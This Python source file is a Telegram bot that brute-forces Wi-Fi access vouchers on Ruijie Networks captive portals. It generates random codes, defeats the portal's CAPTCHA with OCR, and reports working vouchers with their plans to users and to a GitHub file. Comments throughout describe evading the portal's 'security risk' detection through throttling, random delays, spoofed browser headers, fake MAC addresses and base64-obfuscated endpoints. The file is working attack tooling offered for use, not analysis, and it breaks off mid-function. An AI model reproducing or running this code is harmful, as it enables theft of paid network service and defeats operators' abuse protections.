import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ OCTOBER 2026 UPDATE: Avoid Security Risk Detection
# ═══════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler('ruijie_bot.log'),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("ruijie-bot")

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')
REPO_OWNER = os.environ.get('REPO_OWNER')
REPO_NAME = os.environ.get('REPO_NAME')

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable not set")

# ── Global structures ─────────────────────────────────────────────────────
TG_MAX_LEN = 4000
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
captcha_state = {}

# Settings
notify_setting = {}
DEFAULT_NOTIFY = True
last_scan_params = {}
pending_brute = {}
success_messages = {}
limited_messages = {}

session = None
_connector = None

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ OCTOBER 2026: Reduced speed to avoid detection
# ═══════════════════════════════════════════════════════════════════════════
CONCURRENCY = 10          # ⭐ Reduced from 300 to avoid security detection
BATCH_SIZE = 20           # ⭐ Reduced from 500
CAPTCHA_RETRY = 3         # Reduced retries
MAX_ATTEMPTS = 2          # Reduced attempts
PROGRESS_INTERVAL = 5     # Update progress every 5 seconds
GITHUB_INTERVAL = 30
SESSION_RECHECK_INTERVAL = 1800  # 30 minutes

# ⭐ Add delay between batches
BATCH_DELAY = (5, 15)     # 5-15 seconds between batches

# ⭐ Add delay between requests
REQUEST_DELAY = (1, 3)    # 1-3 seconds between requests

_voucher_sem = None
_start_time = time.monotonic()

# ⭐ Session MACs for consistency
SESSION_MACS = {}
COOKIE_JARS = {}

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ UPDATED: Portal Configurations with v2 API support
# ═══════════════════════════════════════════════════════════════════════════
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
        "voucher_api_v1": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/portal/index.html?sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": "https://portal-as.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
        "voucher_api_v1": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-as.ruijienetworks.com/api/v2/auth/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/v2/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/v2/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/portal/index.html?sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
    },
    "portal-eu": {
        "domain": "portal-eu.ruijienetworks.com",
        "base_url": "https://portal-eu.ruijienetworks.com",
        "voucher_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
        "voucher_api_v1": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtZXUucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/balance/getBalance",
        "captcha_image_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/captcha/image",
        "captcha_verify_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/captcha/verify",
        "referer_index": "https://portal-eu.ruijienetworks.com/portal/index.html?sessionId=",
        "referer_balance": "https://portal-eu.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
    }
}

DEFAULT_PORTAL = "portal-mm-as"

def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
        elif "portal-eu" in session_url:
            return PORTAL_CONFIGS["portal-eu"], "portal-eu"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL

# ── Helper functions for message safety ────────────────────────────────────
def _truncate(text, limit=TG_MAX_LEN):
    """Truncate text safely for Telegram message limit."""
    if len(text) <= limit:
        return text
    return text[:limit - 20] + "\n… (truncated)"

async def _safe_edit(chat_id, message_id, text, parse_mode=None):
    """Edit message with length-safety and fallback to new message on failure."""
    text = _truncate(text)
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            parse_mode=parse_mode
        )
        return message_id
    except Exception as e:
        try:
            sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
            return sent.message_id
        except Exception as e2:
            log.warning(f"[_safe_edit] failed for {chat_id}: {e} / {e2}")
            return message_id

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7! Updated: 2026-10-18")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception as e:
        log.error(f"[get_file_content] error: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

def _format_bytes(bytes_val):
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3:
            return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2:
            return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024:
            return f"{bytes_val/1024:.3f} KB"
        else:
            return f"{bytes_val:.0f} B"
    except:
        return "N/A"

def _format_quota(used, total=None):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
        else:
            total_used = used
            up = 0
            down = 0

        used_str = _format_bytes(total_used)
        if up and down:
            return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)"
        return used_str
    except:
        return "N/A"

def _parse_expire(expire_str):
    if not expire_str or expire_str == "N/A":
        return None
    s = str(expire_str).strip()
    formats = [
        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d",
        "%Y/%m/%d %H:%M:%S", "%Y/%m/%d %H:%M", "%Y/%m/%d",
        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y %H:%M:%S",
        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
    ]
    for fmt in formats:
        try:
            return datetime.strptime(s, fmt)
        except:
            continue
    return None

def is_expired(expire_str):
    dt = _parse_expire(expire_str)
    if dt is None:
        return False
    return dt < datetime.now()

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ OCTOBER 2026: Realistic MAC generation
# ═══════════════════════════════════════════════════════════════════════════
def get_realistic_mac():
    """
    Generate realistic MAC that looks like a real device
    Use common OUI prefixes
    """
    oui_prefixes = [
        [0x00, 0x1A, 0x2B],  # Samsung
        [0x00, 0x1B, 0x63],  # Apple
        [0x00, 0x1E, 0xC2],  # Intel
        [0x00, 0x21, 0x6A],  # Cisco
        [0x00, 0x23, 0x12],  # D-Link
        [0x00, 0x25, 0x9C],  # Huawei
        [0x00, 0x26, 0xBB],  # Fujitsu
        [0x00, 0x50, 0x56],  # VMware
        [0x08, 0x00, 0x27],  # VirtualBox
    ]

    oui = random.choice(oui_prefixes)
    mac = oui + [random.randint(0x00, 0xff) for _ in range(3)]
    return ':'.join(f'{x:02x}' for x in mac)

def get_session_mac(chat_id):
    """Get or create consistent MAC for session"""
    if chat_id not in SESSION_MACS:
        SESSION_MACS[chat_id] = get_realistic_mac()
    return SESSION_MACS[chat_id]

def get_cookie_jar(chat_id):
    """Get or create persistent cookie jar for session"""
    if chat_id not in COOKIE_JARS:
        COOKIE_JARS[chat_id] = aiohttp.CookieJar()
    return COOKIE_JARS[chat_id]

def get_realistic_headers(portal_config, session_id=None):
    """Generate realistic browser headers"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    ]

    ua = random.choice(user_agents)

    headers = {
        "authority": portal_config['domain'],
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": portal_config['base_url'],
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ua,
        "x-requested-with": "XMLHttpRequest",
    }

    if session_id:
        headers["referer"] = portal_config['referer_index'] + session_id

    return headers

async def get_balance(token, portal_config):
    url = f"{portal_config['balance_api']}/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = get_realistic_headers(portal_config)
    headers['referer'] = portal_config['referer_balance'].format(token=token)

    try:
        async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

            try:
                data = json.loads(raw)
            except Exception:
                return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

            result = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])

            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_minutes(val)
                        break
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_seconds(val)
                        break
                usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if usage:
                    if isinstance(usage, dict):
                        result["usage"] = _format_quota(usage)
                    else:
                        result["usage"] = _format_bytes(usage)
                quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                session_quota = d.get('sessionQuota')
                total_quota = d.get('totalQuota')
                if session_quota and total_quota:
                    result["quota"] = f"{_format_bytes(session_quota)} / {_format_bytes(total_quota)}"
                elif quota:
                    result["quota"] = _format_bytes(quota)
                plan = d.get('plan') or d.get('planName') or d.get('internetPlan') or d.get('package')
                if plan:
                    result["plan"] = str(plan)
                expire = d.get('expireTime') or d.get('expiration') or d.get('expire') or d.get('validUntil')
                if expire:
                    result["expire"] = str(expire)
            return result
    except Exception as e:
        log.error(f"[get_balance] error for {token}: {e}")
        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

def iter_codes(mode, length):
    if mode == 1:
        chars = string.digits
    elif mode == 2:
        chars = string.ascii_lowercase
    elif mode == 3:
        chars = string.ascii_uppercase
    elif mode == 4:
        chars = string.ascii_letters
    elif mode == 5:
        chars = string.ascii_lowercase + string.digits
    else:
        raise ValueError(f"Invalid mode: {mode}. Use 1-5")
    while True:
        yield "".join(random.choice(chars) for _ in range(length))

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ──────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    """
    ⭐ UPDATED: October 2026
    - Use original MAC from URL instead of random MAC
    - Add delay between requests
    - Better error handling
    """
    # ⭐ Use original MAC from URL (don't spoof)
    mac_match = re.search(r'mac=([^&]+)', session_url)
    original_mac = mac_match.group(1) if mac_match else get_realistic_mac()

    url = session_url  # Don't replace MAC

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        'referer': 'http://detectportal.firefox.com/',
    }

    try:
        # ⭐ Add delay to avoid rate limiting
        await asyncio.sleep(random.uniform(0.5, 1.5))

        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)

            # Check for security risk message
            body = await req.text()
            if "security risks" in body or "should be upgraded" in body:
                log.error(f"[get_session_id] Portal blocked: security risk detected")
                return None

            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id

    except Exception as e:
        log.debug(f"[get_session_id] error: {e}")
        return previous_session_id

async def Captcha_Image(session_obj, session_id, portal_config):
    headers = get_realistic_headers(portal_config, session_id)
    headers['accept'] = 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
    headers['sec-fetch-dest'] = 'image'
    headers['sec-fetch-mode'] = 'no-cors'

    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text, portal_config):
    headers = get_realistic_headers(portal_config, session_id)

    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post(portal_config['captcha_verify_api'], headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ UPDATED: Fixed check_session_url for WiFiDog portals
# ═══════════════════════════════════════════════════════════════════════════
async def check_session_url(session_url):
    """
    Check if session URL is valid for WiFiDog portals.
    """
    try:
        # Check if URL has required WiFiDog parameters
        required_params = ['gw_id', 'gw_address', 'gw_port']
        has_params = all(param in session_url for param in required_params)

        if not has_params:
            log.warning(f"[check_session_url] missing WiFiDog params in URL")
            return False

        # Try to get session info
        portal_config, portal_name = get_portal_config(session_url)

        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as test_session:

            # Use random MAC like perform_check does
            mac = get_realistic_mac()
            test_url = replace_mac(session_url, new_mac=mac)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }

            async with test_session.get(
                test_url, 
                allow_redirects=True,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:

                # Check for security risk message
                body = await resp.text()
                if "security risks" in body or "should be upgraded" in body:
                    log.error(f"[check_session_url] SECURITY RISK DETECTED")
                    return False

                # Method 1: Check redirect URL for sessionId
                response_url = str(resp.url)
                if "sessionId" in response_url:
                    log.info(f"[check_session_url] sessionId found in URL")
                    return True

                # Method 2: Check response body for sessionId
                if "sessionId" in body or "session_id" in body:
                    log.info(f"[check_session_url] sessionId found in body")
                    return True

                # Method 3: If we get any successful response, session is likely valid
                if resp.status == 200:
                    log.info(f"[check_session_url] got 200 response, assuming valid")
                    return True

                # Method 4: Check for redirect (302/303)
                if resp.status in [301, 302, 303, 307, 308]:
                    log.info(f"[check_session_url] got redirect {resp.status}, assuming valid")
                    return True

                log.warning(f"[check_session_url] unexpected status: {resp.status}")
                return False

    except Exception as e:
        log.debug(f"[check_session_url] error: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ UPDATED: Core voucher check with security detection
# ═══════════════════════════════════════════════════════════════════════════
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector

    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']

    response = None
    session_id = None

    # ⭐ Use consistent MAC for this session
    session_mac = get_session_mac(chat_id)

    for attempt in range(MAX_ATTEMPTS):
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=get_cookie_jar(chat_id),  # ⭐ Persistent cookies
                timeout=timeout
            ) as task_session:

                # ⭐ Don't replace MAC - use original from URL
                if 'mac=' in session_url:
                    url = session_url  # Use original MAC
                else:
                    url = session_url + f"&mac={session_mac}"

                session_id = await get_session_id(task_session, url)
                if not session_id:
                    log.debug(f"[perform_check] no session_id for {code}, attempt {attempt+1}")
                    continue

                # ⭐ Add realistic delay (2-5 seconds)
                await asyncio.sleep(random.uniform(2, 5))

                auth_code = None
                for captcha_attempt in range(CAPTCHA_RETRY):
                    try:
                        image = await Captcha_Image(task_session, session_id, portal_config)
                        text = await Captcha_Text(image)
                        if not text:
                            continue
                        if await Varify_Captcha(task_session, session_id, text, portal_config):
                            auth_code = text
                            break
                    except Exception as e:
                        log.debug(f"[perform_check] captcha error: {e}")
                        continue

                if not auth_code:
                    log.debug(f"[perform_check] no auth_code for {code}, attempt {attempt+1}")
                    continue

                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return

                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }

                # ⭐ More realistic headers
                headers = get_realistic_headers(portal_config, session_id)

                # ⭐ Add delay before voucher check
                await asyncio.sleep(random.uniform(1, 3))

                try:
                    async with task_session.post(post_url, json=data, headers=headers) as req:
                        response = await req.text()

                        # ⭐ Check for security risk message
                        if "security risks" in response:
                            log.error(f"[perform_check] SECURITY RISK DETECTED for {code}")
                            # Notify admin
                            if ADMIN_ID:
                                try:
                                    await bot.send_message(
                                        int(ADMIN_ID),
                                        f"🚨 SECURITY RISK DETECTED!\nPortal: {portal_name}\nCode: {code}\nStopping scan..."
                                    )
                                except:
                                    pass
                            # Stop all scans
                            for cid, task_data in scan_tasks.items():
                                task_data["stop"] = True
                                if not task_data["task"].done():
                                    task_data["task"].cancel()
                            return None

                        json.loads(response)

                except Exception as e:
                    log.debug(f"[perform_check] network error for {code}: {e}")
                    continue

            if response and 'request limited' in response:
                wait = min(2 ** attempt, 6)
                log.info(f"[perform_check] rate limited, waiting {wait}s")
                await asyncio.sleep(wait)
                continue
            break

        except Exception as e:
            log.error(f"[perform_check] unexpected error for {code}: {e}")
            await asyncio.sleep(1)
            continue

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        usage_str = "N/A"
        quota_str = "N/A"
        expire_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
            balance_info = await get_balance(token, portal_config)
            if isinstance(balance_info, dict):
                plan_str = balance_info.get("time", "N/A")
                usage_str = balance_info.get("usage", "N/A")
                quota_str = balance_info.get("quota", "N/A")
                expire_str = balance_info.get("expire", "N/A")
        except Exception as e:
            log.debug(f"[perform_check] balance parse error: {e}")

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code,
            "session_id": session_id,
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str,
            "expire": expire_str,
            "portal": portal_name
        })

        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code,
            "session_id": session_id,
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str
        })

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_lines = []
            for item in success_texts[chat_id]:
                line = f"`{item['code']}` – ⏳ {item['plan']}"
                if item.get('usage') and item['usage'] != 'N/A':
                    line += f"\n   📊 {item['usage']}"
                if item.get('quota') and item['quota'] != 'N/A':
                    line += f" | 💾 {item['quota']}"
                if item.get('portal'):
                    line += f" | 🌐 {item['portal']}"
                code_lines.append(line)
            code_text = "\n".join(code_lines)
            full = f"✅ Success Codes:\n{code_text}"

            if chat_id not in success_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full), parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] success send failed: {e}")
            else:
                success_messages[chat_id] = await _safe_edit(
                    chat_id, success_messages[chat_id], full, parse_mode="Markdown"
                )
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            full = f"⚠️ Limited Codes:\n{limited_line}"
            if chat_id not in limited_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full))
                    limited_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] limited send failed: {e}")
            else:
                limited_messages[chat_id] = await _safe_edit(
                    chat_id, limited_messages[chat_id], full
                )

# ═══════════════════════════════════════════════════════════════════════════
# ⭐ UPDATED: Brute-force runner with delays
# ═══════════════════════════════════════════════════════════════════════════
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = None
    checked = 0
    found = 0
    scan_start = time.monotonic()
    last_progress_update = 0

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                batch.append(next(code_iter))

            async def _check(code):
                async with _voucher_sem:
                    # ⭐ Add delay between requests
                    await asyncio.sleep(random.uniform(*REQUEST_DELAY))
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message,
                        plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            now = time.monotonic()
            if now - last_progress_update >= PROGRESS_INTERVAL:
                text = format_progress(checked, total, speed, found, target)
                new_id = await _safe_edit(chat_id, progress_msg.message_id, text)
                if new_id != progress_msg.message_id:
                    progress_msg.message_id = new_id
                last_progress_update = now

            # ⭐ Add delay between batches
            await asyncio.sleep(random.uniform(*BATCH_DELAY))

    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ───────────────────────────────────────────────
async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(GITHUB_INTERVAL)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue
        try:
            results, sha = await get_file_content("result.json")
            for item in items:
                chat_id = str(item["chat_id"])
                code = item["code"]
                if chat_id not in results:
                    results[chat_id] = []
